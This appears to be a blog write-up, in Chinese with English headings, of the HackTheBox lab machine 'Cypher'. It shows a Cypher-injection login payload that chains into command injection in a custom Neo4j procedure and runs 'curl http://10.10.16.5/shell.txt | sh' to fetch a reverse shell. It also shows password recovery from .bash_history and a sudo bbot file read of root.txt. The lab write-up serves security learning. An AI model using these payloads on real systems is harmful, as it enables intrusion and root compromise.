@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before all言簡意賅的好題目，請連連線都連不上的大便 TheFrizz 學一下(Victim’s IP : 10.10.11.57Victim’s Host : *.cypher.htbAttacker’s IP : 10.10.16.5   RECONport scanCommand   1rustscan -a 10.10.11.4 --ulimit 5000 -- -sC -sV -">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cypher on HackTheBox">
+<meta property="og:url" content="http://wha13.github.io/2025/03/18/htb-cypher/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before all言簡意賅的好題目，請連連線都連不上的大便 TheFrizz 學一下(Victim’s IP : 10.10.11.57Victim’s Host : *.cypher.htbAttacker’s IP : 10.10.16.5   RECONport scanCommand   1rustscan -a 10.10.11.4 --ulimit 5000 -- -sC -sV -">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkF2kdI3kg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1vq1uUhJg.png">
+<meta property="article:published_time" content="2025-03-18T06:02:02.000Z">
+<meta property="article:modified_time" content="2025-10-22T07:57:26.374Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="Pentesting">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/SkF2kdI3kg.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Cypher on HackTheBox</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/03/20/burp-bluestacks/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/02/26/hacker101-android/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/03/18/htb-cypher/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/03/18/htb-cypher/&text=Cypher on HackTheBox"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/03/18/htb-cypher/&title=Cypher on HackTheBox"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/03/18/htb-cypher/&is_video=false&description=Cypher on HackTheBox"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cypher on HackTheBox&body=Check out this article: http://wha13.github.io/2025/03/18/htb-cypher/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/03/18/htb-cypher/&title=Cypher on HackTheBox"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/03/18/htb-cypher/&title=Cypher on HackTheBox"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/03/18/htb-cypher/&title=Cypher on HackTheBox"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/03/18/htb-cypher/&title=Cypher on HackTheBox"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/03/18/htb-cypher/&name=Cypher on HackTheBox&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/03/18/htb-cypher/&t=Cypher on HackTheBox"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">2.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#port-scan"><span class="toc-number">2.1.</span> <span class="toc-text">port scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#directory-enumeration"><span class="toc-number">2.2.</span> <span class="toc-text">directory enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jar-decompile"><span class="toc-number">3.1.</span> <span class="toc-text">Jar decompile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cypher-Injection-to-RCE"><span class="toc-number">3.2.</span> <span class="toc-text">Cypher Injection to RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">4.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Collection"><span class="toc-number">4.1.</span> <span class="toc-text">Password Collection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-reading-through-sudo-bbot"><span class="toc-number">4.2.</span> <span class="toc-text">File reading through sudo bbot</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">5.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Cypher on HackTheBox
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-18T06:02:02.000Z" class="dt-published" itemprop="datePublished">2025-03-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/HackTheBox/" rel="tag">HackTheBox</a>, <a class="p-category" href="/tags/Pentesting/" rel="tag">Pentesting</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>言簡意賅的好題目，請連連線都連不上的大便 TheFrizz 學一下(<br>Victim’s IP : 10.10.11.57<br>Victim’s Host : *.cypher.htb<br>Attacker’s IP : 10.10.16.5  </p>
+<h2 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h2><h3 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h3><p><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rustscan -a 10.10.11.4 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Open 10.10.11.57:22</span><br><span class="line">Open 10.10.11.57:80</span><br></pre></td></tr></table></figure>
+<p>標準的 ssh + http</p>
+<h3 id="directory-enumeration"><a href="#directory-enumeration" class="headerlink" title="directory enumeration"></a>directory enumeration</h3><p><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch --url <span class="string">&#x27;http://cypher.htb&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">Target: http://cypher.htb/</span><br><span class="line"></span><br><span class="line">[06:21:47] Starting:                                                                                                               </span><br><span class="line">[06:22:12] 200 -    5KB - /about                                            </span><br><span class="line">[06:22:12] 200 -    5KB - /about.html                                       </span><br><span class="line">[06:22:32] 307 -    0B  - /api  -&gt;  /api/docs                               </span><br><span class="line">[06:22:32] 404 -   22B  - /api-docs</span><br><span class="line">[06:22:32] 404 -   22B  - /api-doc</span><br><span class="line">[06:22:32] 404 -   22B  - /api.log</span><br><span class="line">[06:22:32] 404 -   22B  - /api.php</span><br><span class="line">[06:22:32] 404 -   22B  - /api/_swagger_/</span><br><span class="line">[06:22:32] 404 -   22B  - /api.py</span><br><span class="line">[06:22:32] 404 -   22B  - /api/api-docs</span><br><span class="line">[06:22:32] 404 -   22B  - /api/2/explore/</span><br><span class="line">[06:22:32] 404 -   22B  - /api/2/issue/createmeta</span><br><span class="line">[06:22:32] 404 -   22B  - /api/api</span><br><span class="line">[06:22:32] 307 -    0B  - /api/  -&gt;  http://cypher.htb/api/api</span><br><span class="line">[06:22:32] 404 -   22B  - /api/__swagger__/</span><br><span class="line">[06:22:32] 404 -   22B  - /api/apidocs</span><br><span class="line">[06:22:32] 404 -   22B  - /api/application.wadl</span><br><span class="line">[06:22:32] 404 -   22B  - /api/cask/graphql</span><br><span class="line">[06:22:32] 404 -   22B  - /api/batch</span><br><span class="line">[06:22:32] 404 -   22B  - /api/apidocs/swagger.json</span><br><span class="line">[06:22:33] 404 -   22B  - /api/docs/</span><br><span class="line">[06:22:33] 404 -   22B  - /api/config</span><br><span class="line">[06:22:33] 404 -   22B  - /api/docs</span><br><span class="line">[06:22:33] 404 -   22B  - /api/error_log                                    </span><br><span class="line">[06:22:33] 404 -   22B  - /api/jsonws/invoke</span><br><span class="line">[06:22:33] 404 -   22B  - /api/login.json</span><br><span class="line">[06:22:33] 404 -   22B  - /api/jsonws</span><br><span class="line">[06:22:33] 404 -   22B  - /api/package_search/v4/documentation</span><br><span class="line">[06:22:33] 404 -   22B  - /api/profile</span><br><span class="line">[06:22:33] 404 -   22B  - /api/snapshots</span><br><span class="line">[06:22:33] 404 -   22B  - /api/proxy</span><br><span class="line">[06:22:33] 404 -   22B  - /api/swagger.yaml                                 </span><br><span class="line">[06:22:33] 404 -   22B  - /api/swagger.json</span><br><span class="line">[06:22:33] 404 -   22B  - /api/swagger</span><br><span class="line">[06:22:33] 404 -   22B  - /api/swagger.yml</span><br><span class="line">[06:22:33] 404 -   22B  - /api/spec/swagger.json</span><br><span class="line">[06:22:33] 404 -   22B  - /api/swagger/swagger                              </span><br><span class="line">[06:22:33] 404 -   22B  - /api/v1/</span><br><span class="line">[06:22:33] 404 -   22B  - /api/timelion/run</span><br><span class="line">[06:22:33] 404 -   22B  - /api/swagger/ui/index</span><br><span class="line">[06:22:33] 404 -   22B  - /api/v1</span><br><span class="line">[06:22:33] 404 -   22B  - /api/v1/swagger.yaml</span><br><span class="line">[06:22:33] 404 -   22B  - /api/v2/</span><br><span class="line">[06:22:33] 404 -   22B  - /api/v2/swagger.json</span><br><span class="line">[06:22:33] 404 -   22B  - /api/v1/swagger.json</span><br><span class="line">[06:22:33] 404 -   22B  - /api/v2</span><br><span class="line">[06:22:33] 404 -   22B  - /api/v2/helpdesk/discover</span><br><span class="line">[06:22:33] 404 -   22B  - /api/v3</span><br><span class="line">[06:22:33] 404 -   22B  - /api/v4</span><br><span class="line">[06:22:33] 404 -   22B  - /api/version</span><br><span class="line">[06:22:33] 404 -   22B  - /api/v2/swagger.yaml</span><br><span class="line">[06:22:33] 404 -   22B  - /api/whoami</span><br><span class="line">[06:22:33] 404 -   22B  - /api/vendor/phpunit/phpunit/phpunit</span><br><span class="line">[06:22:33] 404 -   22B  - /apibuild.pyc</span><br><span class="line">[06:22:33] 404 -   22B  - /apis</span><br><span class="line">[06:22:33] 404 -   22B  - /apidoc</span><br><span class="line">[06:22:33] 404 -   22B  - /apiserver-aggregator-ca.cert</span><br><span class="line">[06:22:33] 404 -   22B  - /apidocs</span><br><span class="line">[06:22:33] 404 -   22B  - /apiserver-aggregator.cert</span><br><span class="line">[06:22:33] 404 -   22B  - /apiserver-client.crt</span><br><span class="line">[06:22:33] 404 -   22B  - /apiserver-key.pem                                </span><br><span class="line">[06:22:33] 404 -   22B  - /apiserver-aggregator.key                         </span><br><span class="line">[06:22:50] 404 -   22B  - /demo.php                                         </span><br><span class="line">[06:22:50] 307 -    0B  - /demo  -&gt;  /login                                 </span><br><span class="line">[06:22:50] 404 -   22B  - /demo.aspx</span><br><span class="line">[06:22:50] 404 -   22B  - /demo.jsp</span><br><span class="line">[06:22:50] 307 -    0B  - /demo/  -&gt;  http://cypher.htb/api/demo</span><br><span class="line">[06:22:50] 404 -   22B  - /demo.js</span><br><span class="line">[06:22:50] 404 -   22B  - /demoadmin</span><br><span class="line">[06:22:50] 404 -   22B  - /demo/sql/index.jsp                               </span><br><span class="line">[06:22:50] 404 -   22B  - /demo/ojspext/events/globals.jsa                  </span><br><span class="line">[06:22:50] 404 -   22B  - /demos/</span><br><span class="line">[06:23:09] 200 -    4KB - /login                                            </span><br><span class="line">[06:23:09] 200 -    4KB - /login.html                                       </span><br><span class="line">[06:23:44] 301 -  178B  - /testing  -&gt;  http://cypher.htb/testing/</span><br></pre></td></tr></table></figure>
+<p>在 testing 路徑開放的目錄取得<code>custom-apoc-extension-1.0-SNAPSHOT.jar</code>  </p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Jar-decompile"><a href="#Jar-decompile" class="headerlink" title="Jar decompile"></a>Jar decompile</h3><p>使用 decompiler.com 反組譯：<br><code>custom-apoc-extension-1.0-SNAPSHOT.jar/com/cypher/neo4j/apoc/CustomFunctions.java</code>   </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomFunctions</span> &#123;</span><br><span class="line">   <span class="meta">@Procedure(</span></span><br><span class="line"><span class="meta">      name = &quot;custom.getUrlStatusCode&quot;,</span></span><br><span class="line"><span class="meta">      mode = Mode.READ</span></span><br><span class="line"><span class="meta">   )</span></span><br><span class="line">   <span class="meta">@Description(&quot;Returns the HTTP status code for the given URL as a string&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> Stream&lt;CustomFunctions.StringOutput&gt; getUrlStatusCode(<span class="meta">@Name(&quot;url&quot;)</span> String url) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="keyword">if</span> (!url.toLowerCase().startsWith(<span class="string">&quot;http://&quot;</span>) &amp;&amp; !url.toLowerCase().startsWith(<span class="string">&quot;https://&quot;</span>)) &#123;</span><br><span class="line">         url = <span class="string">&quot;https://&quot;</span> + url;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      String[] command = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;curl -s -o /dev/null --connect-timeout 1 -w %&#123;http_code&#125; &quot;</span> + url&#125;;</span><br><span class="line">      System.out.println(<span class="string">&quot;Command: &quot;</span> + Arrays.toString(command));</span><br><span class="line">      <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line">      <span class="type">BufferedReader</span> <span class="variable">inputReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">      <span class="type">BufferedReader</span> <span class="variable">errorReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getErrorStream()));</span><br><span class="line">      <span class="type">StringBuilder</span> <span class="variable">errorOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">...</span><br><span class="line">	   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>這是一個自定義的指令集 CustomFunctions，可透過 neo4j query 調用<br>調用方法是<code>CALL custom.getUrlStatusCode(BLABLABLA)</code><br>在用 bash 做 curl 的地方信任使用者傳入的 url 值，有 CMDI 的漏洞  </p>
+<h3 id="Cypher-Injection-to-RCE"><a href="#Cypher-Injection-to-RCE" class="headerlink" title="Cypher Injection to RCE"></a>Cypher Injection to RCE</h3><p>嘗試於<code>cypher.htb/login</code>以<code>whale120&#39;/meow</code>進行登入發現報錯：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py&quot;, line 245, in on_failure</span><br><span class="line">    raise Neo4jError.hydrate(**metadata)</span><br><span class="line">neo4j.exceptions.CypherSyntaxError: &#123;code: Neo.ClientError.Statement.SyntaxError&#125; &#123;message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 63 (offset: 62))</span><br><span class="line">&quot;MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = &#x27;whale120&#x27;&#x27; return h.value as hash&quot;</span><br><span class="line">                                                               ^&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>有 Cypher Injection 風險 (近似於 SQL Injection，但是用 Cypher Query)<br>直接呼叫剛剛的 <code>custom.getUrlStatusCode</code> 做 cmdi  </p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;whale120&#x27; OR 1=1 CALL custom.getUrlStatusCode(&#x27;10.10.16.5; curl http://10.10.16.5/shell.txt | sh # &#x27;) YIELD statusCode WITH 1 as a MATCH (n) RETURN n//&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;meow&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>shell.txt 放 reverse shell payload，用 python 開本地 80 port  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/SkF2kdI3kg.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/r1vq1uUhJg.png" alt="image"></p>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Password-Collection"><a href="#Password-Collection" class="headerlink" title="Password Collection"></a>Password Collection</h3><p>從 neo4j 的 .bash_history 拿到 graphasm 的密碼  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">neo4j@cypher:/$ <span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">neo4j@cypher:~$ <span class="built_in">cat</span> .bash_history</span><br><span class="line"><span class="built_in">cat</span> .bash_history</span><br><span class="line">neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK</span><br><span class="line">neo4j@cypher:~$ <span class="built_in">ls</span> /home</span><br><span class="line"><span class="built_in">ls</span> /home</span><br><span class="line">graphasm</span><br></pre></td></tr></table></figure>
+
+<h3 id="File-reading-through-sudo-bbot"><a href="#File-reading-through-sudo-bbot" class="headerlink" title="File reading through sudo bbot"></a>File reading through sudo bbot</h3><p>檢查權限，可以用 ROOT 做 bbot 指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">graphasm@cypher:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for graphasm on cypher:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User graphasm may run the following commands on cypher:</span><br><span class="line">    (ALL) NOPASSWD: /usr/local/bin/bbot</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>利用引入 target file + debug 的方法讀 root.txt  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bbot -t /root/root.txt -d</span><br></pre></td></tr></table></figure>
+
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>最近在忙qq  </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">2.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#port-scan"><span class="toc-number">2.1.</span> <span class="toc-text">port scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#directory-enumeration"><span class="toc-number">2.2.</span> <span class="toc-text">directory enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jar-decompile"><span class="toc-number">3.1.</span> <span class="toc-text">Jar decompile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cypher-Injection-to-RCE"><span class="toc-number">3.2.</span> <span class="toc-text">Cypher Injection to RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">4.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Collection"><span class="toc-number">4.1.</span> <span class="toc-text">Password Collection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-reading-through-sudo-bbot"><span class="toc-number">4.2.</span> <span class="toc-text">File reading through sudo bbot</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">5.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
